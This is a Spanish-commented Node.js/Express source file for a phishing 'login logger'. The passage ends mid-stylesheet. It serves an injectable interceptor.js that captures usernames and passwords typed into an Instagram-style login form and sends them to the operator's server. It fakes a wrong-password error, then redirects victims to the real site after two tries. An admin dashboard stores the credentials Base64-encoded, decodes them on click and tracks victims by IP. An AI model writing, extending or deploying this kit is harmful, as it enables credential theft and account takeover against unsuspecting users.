/**
 * LOGIN LOGGER — Server v4
 *
 * Nuevas funcionalidades v4:
 *   - Interceptor de login embebido y servido desde este mismo servidor
 *     en GET /interceptor.js  (sin fichero externo)
 *   - Evento max_attempts_redirect: se detecta y registra cuando el
 *     cliente agota los intentos y es redirigido automáticamente
 *   - Stat card "Redirigidos" en el dashboard
 *   - Badge 🚨 max_attempts en el visor de logs
 *
 * Funcionalidades heredadas de v3:
 *   - Sistema multi-usuario: añadir, cambiar contraseña y eliminar admins
 *   - Eliminar entradas de log individuales
 *   - Paginación completa con navegación
 *   - Tiempo de refresco configurable (persiste en localStorage)
 *   - Contador total de logs independiente del filtro de paginación
 *   - Contraseñas en login_attempt guardadas en Base64 (reversible en el visor)
 *
 * Uso del interceptor en la página objetivo:
 *   <script src="https://TU-SERVIDOR/interceptor.js"></script>
 *
 * Credenciales por defecto: admin / supersecret123
 * Se persisten en logs/admin-users.json
 *
 * Variables de entorno:
 *   PORT  (default: 3000)
 */

const express   = require("express");
const path      = require("path");
const fs        = require("fs");
const bcrypt    = require("bcryptjs");
const winston   = require("winston");
const rateLimit = require("express-rate-limit");
const helmet    = require("helmet");

const app  = express();
const PORT = process.env.PORT || 3000;

// ──────────────────────────────────────────────────────────
// DIRECTORIOS
// ──────────────────────────────────────────────────────────
const logsDir   = path.join(__dirname, "logs");
const usersFile = path.join(logsDir, "admin-users.json");
if (!fs.existsSync(logsDir)) fs.mkdirSync(logsDir, { recursive: true });

// ──────────────────────────────────────────────────────────
// GESTIÓN DE USUARIOS ADMIN
// ──────────────────────────────────────────────────────────
const DEFAULT_PASS_HASH = "$2b$12$CtjIMHgVJWakAJU3V/cWB.V9oHkVYlS/4IyWWyA2eHrrsCsm7tOqu"; // "supersecret123"

let adminUsers = [];

function loadAdminUsers() {
  try {
    if (fs.existsSync(usersFile)) {
      const parsed = JSON.parse(fs.readFileSync(usersFile, "utf-8"));
      if (Array.isArray(parsed) && parsed.length > 0) {
        adminUsers = parsed;
        console.log("✅  " + adminUsers.length + " usuario(s) admin cargado(s)");
        return;
      }
    }
  } catch (e) {
    console.warn("⚠️  No se pudo cargar admin-users.json:", e.message);
  }
  adminUsers = [{ username: "admin", passHash: DEFAULT_PASS_HASH }];
  saveAdminUsers();
}

function saveAdminUsers() {
  fs.writeFileSync(usersFile, JSON.stringify(adminUsers, null, 2), "utf-8");
}

loadAdminUsers();

// ──────────────────────────────────────────────────────────
// LOGGER
// ──────────────────────────────────────────────────────────
const logger = winston.createLogger({
  level: "info",
  format: winston.format.combine(
    winston.format.timestamp({ format: "YYYY-MM-DD HH:mm:ss" }),
    winston.format.json()
  ),
  transports: [
    new winston.transports.File({
      filename: path.join(logsDir, "access.log"),
      maxsize: 10 * 1024 * 1024,
      maxFiles: 10,
      tailable: true,
    }),
    new winston.transports.File({
      filename: path.join(logsDir, "error.log"),
      level: "error",
      maxsize: 5 * 1024 * 1024,
      maxFiles: 5,
      tailable: true,
    }),
    new winston.transports.Console({
      format: winston.format.combine(
        winston.format.colorize(),
        winston.format.printf(({ timestamp, level, message, ...meta }) =>
          `${timestamp} [${level}] ${message} ${Object.keys(meta).length ? JSON.stringify(meta) : ""}`
        )
      ),
    }),
  ],
});

// ──────────────────────────────────────────────────────────
// HELPERS
// ──────────────────────────────────────────────────────────
function getClientIP(req) {
  return (
    req.headers["x-forwarded-for"]?.split(",")[0].trim() ||
    req.headers["x-real-ip"]          ||
    req.headers["cf-connecting-ip"]   ||
    req.headers["true-client-ip"]     ||
    req.socket?.remoteAddress         ||
    req.connection?.remoteAddress     ||
    "unknown"
  );
}

function buildLogEntry(req, extra = {}) {
  return {
    ip:        getClientIP(req),
    method:    req.method,
    path:      req.path,
    userAgent: req.headers["user-agent"] || "unknown",
    referer:   req.headers["referer"]         || null,
    language:  req.headers["accept-language"] || null,
    encoding:  req.headers["accept-encoding"] || null,
    origin:    req.headers["origin"]          || null,
    host:      req.headers["host"]            || null,
    ...extra,
  };
}

// ── Eventos que se indexan en el visor ──────────────────────
const RELEVANT = [
  "login_attempt",
  "max_attempts_redirect",   // ← v4
  "page_visit",
  "admin_access",
  "admin_access_denied",
  "rate_limit_exceeded",
];

function readAllLogs() {
  const logFile = path.join(logsDir, "access.log");
  if (!fs.existsSync(logFile)) return [];
  return fs.readFileSync(logFile, "utf-8")
    .split("\n")
    .map((raw, i) => {
      try {
        const parsed = JSON.parse(raw);
        return RELEVANT.includes(parsed.message) ? { ...parsed, _lineIndex: i } : null;
      } catch { return null; }
    })
    .filter(Boolean);
}

function deleteLogLine(lineIndex) {
  const logFile = path.join(logsDir, "access.log");
  if (!fs.existsSync(logFile)) return false;
  const lines = fs.readFileSync(logFile, "utf-8").split("\n");
  if (lineIndex < 0 || lineIndex >= lines.length) return false;
  lines.splice(lineIndex, 1);
  fs.writeFileSync(logFile, lines.join("\n"), "utf-8");
  return true;
}

// ──────────────────────────────────────────────────────────
// MIDDLEWARES GLOBALES
// ──────────────────────────────────────────────────────────
app.use(helmet({ contentSecurityPolicy: false }));
app.set("trust proxy", 1);
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// ──────────────────────────────────────────────────────────
// RATE LIMITER
// ──────────────────────────────────────────────────────────
const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 20,
  keyGenerator: (req) => getClientIP(req),
  handler: (req, res) => {
    logger.warn("rate_limit_exceeded", { ...buildLogEntry(req), event: "RATE_LIMIT" });
    res.status(429).json({ success: false, error: "Demasiados intentos. Espera 15 minutos." });
  },
});

app.use(express.static(path.join(__dirname, "public")));

// ──────────────────────────────────────────────────────────
// GET /interceptor.js
// Sirve el script de interceptación de login como archivo JS.
// Incluirlo en la página objetivo con:
//   <script src="https://TU-SERVIDOR/interceptor.js"></script>
// ──────────────────────────────────────────────────────────
app.get("/interceptor.js", (req, res) => {
  // ── Configuración del interceptor ──────────────────────
  // Cambia estos valores según tu despliegue.
  const BACKEND      = `https://${req.headers.host}/login`;
  const VISIT_URL    = `https://${req.headers.host}/visit`;
  const REDIRECT_URL = "https://www.instagram.com/";
  const MAX_ATTEMPTS = 2;
  const PAGE_ID      = "instagram";
  const ERROR_MSG    = "Tu contraseña es incorrecta. Compruébala e inténtalo de nuevo.";
  // ───────────────────────────────────────────────────────

  const script = `/* LOGIN INTERCEPTOR v4 — auto-generado por el servidor */
(function () {
  'use strict';
  var PAGE_ID      = ${JSON.stringify(PAGE_ID)};
  var BACKEND      = ${JSON.stringify(BACKEND)};
  var VISIT_URL    = ${JSON.stringify(VISIT_URL)};
  var REDIRECT_URL = ${JSON.stringify(REDIRECT_URL)};
  var MAX_ATTEMPTS = ${MAX_ATTEMPTS};
  var ERROR_MSG    = ${JSON.stringify(ERROR_MSG)};
  var _sent        = false;

  /* ── Contador de intentos en sessionStorage ─────────── */
  function getAttempts() {
    return parseInt(sessionStorage.getItem('_ig_attempts') || '0', 10);
  }
  function incrementAttempts() {
    var n = getAttempts() + 1;
    sessionStorage.setItem('_ig_attempts', n);
    return n;
  }

  /* ── Envío de logs (sendBeacon + fetch fallback) ─────── */
  function sendLog(url, data) {
    var payload = JSON.stringify(data);
    if (navigator.sendBeacon) {
      try {
        return navigator.sendBeacon(url, new Blob([payload], { type: 'application/json' }));
      } catch (_e) {}
    }
    return fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: payload,
      keepalive: true
    }).catch(function () {});
  }

  /* ── Visita de página ───────────────────────────────── */
  sendLog(VISIT_URL, {
    page: window.location.pathname,
    user: 'anonymous',
    event: 'PAGE_VISIT'
  });

  /* ── Error UI ─────────────────────────────────────────── */
  function showError() {
    var d = document.getElementById('_ig_err');
    if (!d) {
      d = document.createElement('div');
      d.id = '_ig_err';
      d.style.cssText = [
        'background:#fffbe5', 'border:1px solid #f0c040',
        'border-radius:6px', 'padding:10px 14px', 'margin:8px 0 4px',
        'color:#333', 'font-size:14px',
        'font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif',
        'text-align:center', 'line-height:1.4', 'z-index:9999', 'position:relative'
      ].join(';');
      var form = document.getElementById('login_form');
      if (form && form.parentNode) {
        form.parentNode.insertBefore(d, form);
      } else {
        document.body.insertBefore(d, document.body.firstChild);
      }
    }
    d.textContent = ERROR_MSG;
    d.style.display = 'block';
  }

  /* ── Envío al backend ─────────────────────────────────── */
  async function sendToBackend(username, password, extraFields) {
    await sendLog(BACKEND, Object.assign({
      username: username,
      password: password,
      page:     PAGE_ID,
      event:    'LOGIN_ATTEMPT'
    }, extraFields || {}));
  }

  /* ── Lógica principal ─────────────────────────────────── */
  async function onLoginAttempt(e) {
    if (e) {
      e.preventDefault();
      e.stopImmediatePropagation();
      e.stopPropagation();
    }
    if (_sent) return;
    _sent = true;
    setTimeout(function () { _sent = false; }, 800);

    var form = document.getElementById('login_form');
    var user = '', pass = '';
    if (form) {
      var uEl = form.querySelector('[name="email"]') || form.querySelector('[name="username"]');
      var pEl = form.querySelector('[name="pass"]')  || form.querySelector('[name="password"]');
      user = uEl ? uEl.value.trim() : '';
      pass = pEl ? pEl.value : '';
    }

    var attempts = incrementAttempts();

    if (attempts >= MAX_ATTEMPTS) {
      sessionStorage.removeItem('_ig_attempts');
      await sendToBackend(user, pass, {
        event:      'MAX_ATTEMPTS_REDIRECT',
        attempts:   attempts,
        redirectTo: REDIRECT_URL
      });
      setTimeout(function () { window.location.href = REDIRECT_URL; }, 600);
    } else {
      await sendToBackend(user, pass);
      showError();
    }
    return false;
  }

  /* ── ¿Es este evento un intento de login? ─────────────── */
  function isLoginTarget(target) {
    if (!target) return false;
    var el = target, depth = 0;
    while (el && depth < 8) {
      var label = (el.getAttribute && el.getAttribute('aria-label')) || '';
      if (label === 'Iniciar sesión') return true;
      if (el.getAttribute && el.getAttribute('role') === 'button') {
        var f = document.getElementById('login_form');
        if (f && f.contains(el)) return true;
      }
      var tag = (el.tagName || '').toLowerCase();
      if (tag === 'button' || (tag === 'input' && el.type === 'submit')) {
        var f2 = document.getElementById('login_form');
        if (f2 && f2.contains(el)) return true;
      }
      el = el.parentElement;
      depth++;
    }
    return false;
  }

  /* ── Delegación de eventos en document ────────────────── */
  ['click', 'touchend', 'pointerup'].forEach(function (ev) {
    document.addEventListener(ev, function (e) {
      if (isLoginTarget(e.target)) onLoginAttempt(e);
    }, true);
  });
  document.addEventListener('submit', function (e) {
    if (e.target && e.target.id === 'login_form') onLoginAttempt(e);
  }, true);
  document.addEventListener('keydown', function (e) {
    if (e.key !== 'Enter' && e.keyCode !== 13) return;
    var form = document.getElementById('login_form');
    if (form && form.contains(e.target)) onLoginAttempt(e);
  }, true);

})();`;

  res.setHeader("Content-Type", "application/javascript; charset=utf-8");
  res.setHeader("Cache-Control", "no-store");
  res.send(script);
});

// ──────────────────────────────────────────────────────────
// POST /login
// Gestiona tanto LOGIN_ATTEMPT normal como MAX_ATTEMPTS_REDIRECT
// ──────────────────────────────────────────────────────────
app.post("/login", loginLimiter, (req, res) => {
  const { username, password, page, event, attempts, redirectTo } = req.body;

  const passwordB64 = password
    ? Buffer.from(password).toString("base64")
    : "(vacío)";

  const isRedirect = event === "MAX_ATTEMPTS_REDIRECT";

  logger.info(
    isRedirect ? "max_attempts_redirect" : "login_attempt",
    buildLogEntry(req, {
      event:          isRedirect ? "MAX_ATTEMPTS_REDIRECT" : "LOGIN_ATTEMPT",
      page:           page || null,
      username:       username || "(vacío)",
      password:       passwordB64,
      passwordLength: password ? password.length : 0,
      // Campos extra solo presentes en el evento de redirección
      ...(isRedirect && {
        attempts:   attempts   || null,
        redirectTo: redirectTo || null,
      }),
    })
  );

  res.status(401).json({ success: false, error: "Credenciales incorrectas. Por favor, inténtalo de nuevo." });
});

// ──────────────────────────────────────────────────────────
// POST /visit
// ──────────────────────────────────────────────────────────
app.post("/visit", (req, res) => {
  const { page, user } = req.body || {};
  logger.info("page_visit", buildLogEntry(req, {
    event: "PAGE_VISIT",
    page:  page || "/",
    user:  user || "anonymous",
  }));
  res.json({ success: true });
});

// ──────────────────────────────────────────────────────────
// MIDDLEWARE AUTH ADMIN — Basic Auth multi-usuario
// ──────────────────────────────────────────────────────────
async function basicAuth(req, res, next) {
  const authHeader = req.headers["authorization"];
  if (!authHeader || !authHeader.startsWith("Basic ")) {
    res.setHeader("WWW-Authenticate", 'Basic realm="Admin Logs"');
    return res.status(401).send("Acceso no autorizado");
  }

  const decoded  = Buffer.from(authHeader.split(" ")[1], "base64").toString();
  const colonIdx = decoded.indexOf(":");
  const user     = decoded.slice(0, colonIdx);
  const pass     = decoded.slice(colonIdx + 1);

  for (const u of adminUsers) {
    if (u.username === user) {
      const passOk = await bcrypt.compare(pass || "", u.passHash);
      if (passOk) {
        logger.info("admin_access", { ...buildLogEntry(req), event: "ADMIN_LOG_VIEW" });
        return next();
      }
      break;
    }
  }

  const attemptedPassB64 = pass ? Buffer.from(pass).toString("base64") : "(vacío)";
  logger.warn("admin_access_denied", {
    ...buildLogEntry(req),
    event: "ADMIN_UNAUTHORIZED",
    attemptedUser: user || "(vacío)",
    password: attemptedPassB64,
    passwordLength: pass ? pass.length : 0,
  });
  res.setHeader("WWW-Authenticate", 'Basic realm="Admin Logs"');
  return res.status(401).send("Credenciales de administrador incorrectas");
}

// ──────────────────────────────────────────────────────────
// API USUARIOS ADMIN
// ──────────────────────────────────────────────────────────
app.get("/admin/users", basicAuth, (req, res) => {
  res.json({ users: adminUsers.map(u => u.username) });
});

app.post("/admin/users", basicAuth, async (req, res) => {
  const { username, password } = req.body;
  if (!username || !password)
    return res.status(400).json({ error: "Usuario y contraseña son obligatorios." });
  if (password.length < 8)
    return res.status(400).json({ error: "La contraseña debe tener al menos 8 caracteres." });
  if (adminUsers.find(u => u.username === username))
    return res.status(409).json({ error: `El usuario "${username}" ya existe.` });

  const passHash = await bcrypt.hash(password, 12);
  adminUsers.push({ username, passHash });
  saveAdminUsers();
  logger.info("admin_user_added", { ...buildLogEntry(req), event: "ADMIN_USER_ADDED", newUser: username });
  res.json({ success: true, message: `Usuario "${username}" creado.` });
});

app.put("/admin/users/:username/password", basicAuth, async (req, res) => {
  const { username } = req.params;
  const { password }  = req.body;
  if (!password)
    return res.status(400).json({ error: "La nueva contraseña es obligatoria." });
  if (password.length < 8)
    return res.status(400).json({ error: "La contraseña debe tener al menos 8 caracteres." });

  const idx = adminUsers.findIndex(u => u.username === username);
  if (idx === -1)
    return res.status(404).json({ error: `Usuario "${username}" no encontrado.` });

  adminUsers[idx].passHash = await bcrypt.hash(password, 12);
  saveAdminUsers();
  logger.info("admin_password_changed", { ...buildLogEntry(req), event: "ADMIN_PASS_CHANGED", user: username });
  res.json({ success: true, message: `Contraseña de "${username}" actualizada.` });
});

app.delete("/admin/users/:username", basicAuth, async (req, res) => {
  const { username } = req.params;
  if (adminUsers.length <= 1)
    return res.status(400).json({ error: "No puedes eliminar el último usuario admin." });
  const idx = adminUsers.findIndex(u => u.username === username);
  if (idx === -1)
    return res.status(404).json({ error: `Usuario "${username}" no encontrado.` });

  adminUsers.splice(idx, 1);
  saveAdminUsers();
  logger.info("admin_user_deleted", { ...buildLogEntry(req), event: "ADMIN_USER_DELETED", user: username });
  res.json({ success: true, message: `Usuario "${username}" eliminado.` });
});

// ──────────────────────────────────────────────────────────
// DELETE /admin/logs/line/:index
// ──────────────────────────────────────────────────────────
app.delete("/admin/logs/line/:index", basicAuth, (req, res) => {
  const lineIndex = parseInt(req.params.index, 10);
  if (isNaN(lineIndex))
    return res.status(400).json({ error: "Índice inválido." });
  const ok = deleteLogLine(lineIndex);
  if (!ok) return res.status(404).json({ error: "Línea no encontrada." });
  res.json({ success: true });
});

// ──────────────────────────────────────────────────────────
// GET /admin/logs
// ──────────────────────────────────────────────────────────
app.get("/admin/logs", basicAuth, (req, res) => {
  const limit       = Math.min(Math.max(parseInt(req.query.limit) || 50, 1), 500);
  const page        = Math.max(parseInt(req.query.page) || 1, 1);
  const filter      = req.query.filter   || "";
  const type        = req.query.type     || "";
  const ipFilter    = req.query.ip       || "";
  const excludeRaw  = req.query.exclude;
  const excludeList = excludeRaw
    ? (Array.isArray(excludeRaw) ? excludeRaw : [excludeRaw])
    : [];

  const allLines = readAllLogs();

  // Estadísticas globales (sin filtros)
  const totalGlobal          = allLines.length;
  const globalLoginNormal    = allLines.filter(l => l.message === "login_attempt").length;
  const globalMaxAttempts    = allLines.filter(l => l.message === "max_attempts_redirect").length;
  const globalLoginCount     = globalLoginNormal + globalMaxAttempts; // total = normales + redirigidos
  const globalAdminDenied    = allLines.filter(l => l.message === "admin_access_denied").length;
  const globalRateLimited    = allLines.filter(l => l.message === "rate_limit_exceeded").length;

  // IPs de todos los logs
  const ipStats = {};
  allLines.forEach(l => {
    if (!l.ip) return;
    if (!ipStats[l.ip]) ipStats[l.ip] = { total: 0, logins: 0, lastSeen: l.timestamp || "" };
    ipStats[l.ip].total++;
    if (l.message === "login_attempt" || l.message === "max_attempts_redirect")
      ipStats[l.ip].logins++;
    if ((l.timestamp || "") > ipStats[l.ip].lastSeen)
      ipStats[l.ip].lastSeen = l.timestamp || "";
  });

  // Filtrar
  // "login_all" es un tipo virtual que agrupa login_attempt + max_attempts_redirect
  const LOGIN_TYPES = ["login_attempt", "max_attempts_redirect"];
  let filtered = allLines
    .filter(l => !excludeList.includes(l.message))
    .filter(l => !type || (type === "login_all" ? LOGIN_TYPES.includes(l.message) : l.message === type))
    .filter(l => !ipFilter || (l.ip && l.ip.includes(ipFilter)))
    .filter(l => !filter   || JSON.stringify(l).toLowerCase().includes(filter.toLowerCase()));

  filtered = filtered.reverse();

  const totalFiltered = filtered.length;
  const totalPages    = Math.max(Math.ceil(totalFiltered / limit), 1);
  const safePage      = Math.min(page, totalPages);
  const offset        = (safePage - 1) * limit;
  const pageLines     = filtered.slice(offset, offset + limit);

  res.send(buildLogViewerHTML({
    lines: pageLines, limit, page: safePage, totalPages, totalFiltered,
    totalGlobal, globalLoginCount, globalLoginNormal, globalAdminDenied, globalRateLimited, globalMaxAttempts,
    filter, type, excludeList, ipFilter, ipStats,
  }));
});

app.get("/admin/logs/download", basicAuth, (req, res) => {
  const logFile = path.join(logsDir, "access.log");
  if (!fs.existsSync(logFile)) return res.status(404).send("No hay logs disponibles.");
  res.download(logFile, "access.log");
});

app.get("/admin/logout-clear", (req, res) => {
  res.setHeader("WWW-Authenticate", 'Basic realm="Admin Logs"');
  res.status(401).send("logged out");
});

app.get("/admin/logged-out", (req, res) => {
  logger.info("admin_logout", { ...buildLogEntry(req), event: "ADMIN_LOGOUT" });
  res.send(`<!DOCTYPE html>
<html lang="es"><head>
  <meta charset="UTF-8"/>
  <title>Sesión cerrada</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet"/>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.css" rel="stylesheet"/>
</head>
<body class="bg-light d-flex align-items-center justify-content-center" style="height:100vh;">
  <div class="text-center">
    <div style="font-size:4rem;margin-bottom:1rem;">👋</div>
    <h4 class="fw-semibold mb-2">Sesión cerrada correctamente</h4>
    <p class="text-muted mb-4">Tus credenciales han sido eliminadas del navegador.</p>
    <a href="/admin/logs" class="btn btn-primary">
      <i class="bi bi-shield-lock me-1"></i>Volver al panel
    </a>
  </div>
</body></html>`);
});

app.use((req, res) => {
  logger.warn("not_found", { ...buildLogEntry(req), event: "404_NOT_FOUND" });
  res.status(404).json({ error: "Ruta no encontrada" });
});
app.use((err, req, res, next) => {
  logger.error("server_error", { ...buildLogEntry(req), event: "500_SERVER_ERROR", error: err.message });
  res.status(500).json({ error: "Error interno del servidor" });
});

// ══════════════════════════════════════════════════════════
// HTML BUILDER
// ══════════════════════════════════════════════════════════
function buildLogViewerHTML({
  lines, limit, page, totalPages, totalFiltered, totalGlobal,
  globalLoginCount, globalLoginNormal, globalAdminDenied, globalRateLimited, globalMaxAttempts,
  filter, type, excludeList, ipFilter, ipStats,
}) {
  const totalUniqueIPs = Object.keys(ipStats).length;

  function esc(s) {
    if (s == null) return "";
    return String(s)
      .replace(/&/g, "&amp;").replace(/</g, "&lt;")
      .replace(/>/g, "&gt;").replace(/"/g, "&quot;");
  }

  function methodBadge(m) {
    if (!m) return "";
    const cls = m === "GET" ? "success" : m === "POST" ? "primary" : m === "DELETE" ? "danger" : "secondary";
    return `<span class="badge bg-${cls} bg-opacity-10 text-${cls} border border-${cls} border-opacity-25 font-mono">${m}</span>`;
  }

  function eventBadge(msg) {
    const map = {
      login_attempt:          ["login-badge",            "🔑 login_attempt"],
      max_attempts_redirect:  ["purple",                 "🚨 max_attempts"],   // ← v4
      admin_access:           ["success",                "🛡 admin_access"],
      admin_access_denied:    ["danger",                 "⛔ admin_denied"],
      rate_limit_exceeded:    ["warning text-dark",      "🚫 rate_limit"],
      page_visit:             ["info text-dark",         "👁 page_visit"],
    };
    const [cls, label] = map[msg] || ["secondary", esc(msg) || "—"];
    if (cls === "login-badge")
      return `<span class="badge rounded-pill px-2" style="background:#fff0f0;color:#c0392b;border:1px solid #f5c6c6;">${label}</span>`;
    if (cls === "purple")
      return `<span class="badge rounded-pill px-2" style="background:#faf0ff;color:#7e22ce;border:1px solid #e9d5ff;">${label}</span>`;
    return `<span class="badge rounded-pill bg-${cls} px-2">${label}</span>`;
  }

  function pathDisplay(l) {
    if (l.page && l.path) {
      const p = String(l.page).replace(/\/$/, "");
      const r = String(l.path).startsWith("/") ? l.path : "/" + l.path;
      return esc(p + r);
    }
    return esc(l.path || "");
  }

  const rows = lines.map(l => {
    const isLogin    = l.message === "login_attempt";
    const isRedirect = l.message === "max_attempts_redirect";  // ← v4
    const isDenied   = l.message === "admin_access_denied";
    const rowCls     = (isLogin || isRedirect) ? "row-login" : isDenied ? "row-denied" : "";

    let pwCell = '<span class="text-muted">—</span>';
    if ((isLogin || isRedirect) && l.password && l.password !== "(vacío)") {
      pwCell = `<code class="pw-code pw-toggle" data-b64="${esc(l.password)}" data-state="b64" title="Clic para decodificar Base64">${esc(l.password)}</code>`;
    } else if (isLogin || isRedirect) {
      pwCell = `<span class="text-muted fst-italic small">(vacío)</span>`;
    }

    // Celda extra: muestra redirectTo si es un evento de redirección
    const extraInfo = isRedirect && l.redirectTo
      ? `<br/><small class="text-muted font-mono" style="font-size:.68rem;">→ ${esc(l.redirectTo)}</small>`
      : "";

    return `<tr data-line="${l._lineIndex}" class="${rowCls}">
      <td class="text-nowrap small font-mono text-secondary">${esc(l.timestamp) || "—"}</td>
      <td><code class="ip-code ip-clickable" data-ip="${esc(l.ip)}" title="Filtrar por esta IP">${esc(l.ip) || "—"}</code></td>
      <td>${eventBadge(l.message)}</td>
      <td class="text-nowrap">${methodBadge(l.method)} <code class="small text-dark">${pathDisplay(l)}</code>${extraInfo}</td>
      <td>${(isLogin || isRedirect || isDenied)
          ? `<strong class="text-danger">${esc(l.username || l.attemptedUser)}</strong>`
          : '<span class="text-muted">—</span>'}</td>
      <td>${pwCell}</td>
      <td class="small text-muted text-truncate" style="max-width:180px" title="${esc(l.userAgent)}">${esc(l.userAgent) || "—"}</td>
      <td class="text-center">
        <button class="btn-del btn btn-xs px-1 py-0 btn-outline-danger" data-line="${l._lineIndex}" title="Eliminar entrada" style="font-size:.68rem;"><i class="bi bi-trash3"></i></button>
      </td>
    </tr>`;
  }).join("");

  const typeOpts = [
    ["", "Todos los eventos"],
    ["login_all",             "🔑 todos los logins (normal + redirigido)"],
    ["login_attempt",         "🔑 login_attempt (solo normales)"],
    ["max_attempts_redirect", "🚨 max_attempts (solo redirigidos)"],
    ["page_visit",            "👁 page_visit"],
    ["admin_access",          "🛡 admin_access"],
    ["admin_access_denied",   "⛔ admin_denied"],
    ["rate_limit_exceeded",   "🚫 rate_limit"],
  ].map(([v, l]) => `<option value="${v}" ${type === v ? "selected" : ""}>${l}</option>`).join("");

  const limitOpts = [25, 50, 100, 200, 500]
    .map(n => `<option value="${n}" ${n == limit ? "selected" : ""}>${n} / pág.</option>`).join("");

  const ALL_EVENTS = [
    ["login_attempt",         "🔑 login_attempt"],
    ["max_attempts_redirect", "🚨 max_attempts"],
    ["page_visit",            "👁 page_visit"],
    ["admin_access",          "🛡 admin_access"],
    ["admin_access_denied",   "⛔ admin_denied"],
    ["rate_limit_exceeded",   "🚫 rate_limit"],
  ];
  // Pill especial que excluye AMBOS tipos de login a la vez
  const loginBothExcluded = excludeList.includes("login_attempt") && excludeList.includes("max_attempts_redirect");
  const extraPill = `<button type="button" class="exclude-pill btn btn-sm ${loginBothExcluded ? "excluded" : ""}" data-event="login_all" title="Excluye login_attempt y max_attempts a la vez">🔑 todos los logins</button>`;
  const excludePills = extraPill + ALL_EVENTS.map(([v, label]) => {
    const x = excludeList.includes(v);
    return `<button type="button" class="exclude-pill btn btn-sm ${x ? "excluded" : ""}" data-event="${v}">${label}</button>`;
  }).join("");

  function buildPagination() {
    if (totalPages <= 1) return "";
    const buildUrl = (p) => {
      const q = new URLSearchParams();
      if (filter)   q.set("filter", filter);
      if (type)     q.set("type", type);
      if (ipFilter) q.set("ip", ipFilter);
      if (limit !== 50) q.set("limit", limit);
      excludeList.forEach(e => q.append("exclude", e));
      q.set("page", p);
      return "/admin/logs?" + q.toString();
    };
    const WING = 2;
    let pages = [1];
    for (let i = Math.max(2, page - WING); i <= Math.min(totalPages - 1, page + WING); i++) pages.push(i);
    if (totalPages > 1) pages.push(totalPages);
    pages = [...new Set(pages)].sort((a, b) => a - b);

    let html = `<nav aria-label="Paginación"><ul class="pagination pagination-sm justify-content-center flex-wrap mb-0">`;
    html += `<li class="page-item ${page <= 1 ? "disabled" : ""}"><a class="page-link" href="${page > 1 ? buildUrl(page - 1) : "#"}">‹ Ant.</a></li>`;
    let prev = 0;
    for (const p of pages) {
      if (p - prev > 1) html += `<li class="page-item disabled"><span class="page-link">…</span></li>`;
      html += `<li class="page-item ${p === page ? "active" : ""}"><a class="page-link" href="${buildUrl(p)}">${p}</a></li>`;
      prev = p;
    }
    html += `<li class="page-item ${page >= totalPages ? "disabled" : ""}"><a class="page-link" href="${page < totalPages ? buildUrl(page + 1) : "#"}">Sig. ›</a></li>`;
    html += `</ul></nav>`;
    html += `<div class="d-flex justify-content-center align-items-center gap-2 mt-2" style="font-size:.8rem;">
      <span class="text-muted">Ir a página:</span>
      <div class="input-group input-group-sm" style="width:115px;">
        <input type="number" id="gotoPage" class="form-control text-center" min="1" max="${totalPages}" value="${page}" style="font-size:.8rem;"/>
        <button class="btn btn-outline-secondary" onclick="goToPage()">Ir</button>
      </div>
      <span class="text-muted">de <strong>${totalPages}</strong></span>
    </div>`;
    return html;
  }

  const ipRows = Object.entries(ipStats)
    .sort((a, b) => b[1].total - a[1].total)
    .map(([ip, s]) => {
      const risk  = s.logins > 10 ? "danger" : s.logins > 3 ? "warning" : "success";
      const label = s.logins > 10 ? "Alto" : s.logins > 3 ? "Medio" : "Bajo";
      return `<tr>
        <td><code class="ip-code ip-modal-filter" data-ip="${esc(ip)}" style="cursor:pointer" title="Filtrar">${esc(ip)}</code></td>
        <td class="text-center"><span class="badge bg-primary bg-opacity-10 text-primary">${s.total}</span></td>
        <td class="text-center"><span class="badge bg-danger bg-opacity-10 text-danger">${s.logins}</span></td>
        <td class="text-center"><span class="badge bg-${risk} bg-opacity-15 text-${risk}-emphasis border border-${risk} border-opacity-25">${label}</span></td>
        <td class="small text-muted font-mono">${esc(s.lastSeen) || "—"}</td>
        <td><a href="/admin/logs?ip=${encodeURIComponent(ip)}" class="btn btn-xs btn-outline-primary py-0 px-2" style="font-size:.7rem;">Filtrar</a></td>
      </tr>`;
    }).join("");

  return `<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width,initial-scale=1"/>
  <title>Login Logger · Admin</title>
  <link rel="preconnect" href="https://fonts.googleapis.com"/>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet"/>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet"/>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.css" rel="stylesheet"/>
  <style>
    :root{--font-body:'Inter',system-ui,sans-serif;--font-mono:'JetBrains Mono',monospace;--clr-bg:#f0f4f8;--clr-surface:#ffffff;--clr-border:#e2e8f0;--clr-text:#1e293b;--clr-muted:#94a3b8;--clr-accent:#3b82f6;--topbar-h:58px;--radius-card:14px;--shadow-card:0 1px 3px rgba(0,0,0,.06),0 4px 16px rgba(0,0,0,.04);}
    *,*::before,*::after{box-sizing:border-box;}
    body{font-family:var(--font-body);background:var(--clr-bg);color:var(--clr-text);font-size:.875rem;margin:0;}
    .font-mono{font-family:var(--font-mono)!important;}
    /* Topbar */
    .topbar{position:fixed;top:0;left:0;right:0;z-index:1040;background:var(--clr-surface);border-bottom:1px solid var(--clr-border);height:var(--topbar-h);display:flex;align-items:center;gap:.6rem;padding:0 1.25rem;box-shadow:0 1px 4px rgba(0,0,0,.06);}
    .topbar-brand{font-weight:700;font-size:1rem;color:var(--clr-text);text-decoration:none;display:flex;align-items:center;gap:.5rem;flex-shrink:0;}
    .topbar-brand .logo{width:32px;height:32px;border-radius:8px;background:linear-gradient(135deg,#3b82f6,#6366f1);display:grid;place-items:center;color:#fff;font-size:.85rem;}
    .live-indicator{display:flex;align-items:center;gap:.4rem;font-size:.72rem;color:var(--clr-muted);flex-shrink:0;}
    .live-dot{width:7px;height:7px;border-radius:50%;background:#22c55e;animation:livePulse 2s infinite;}
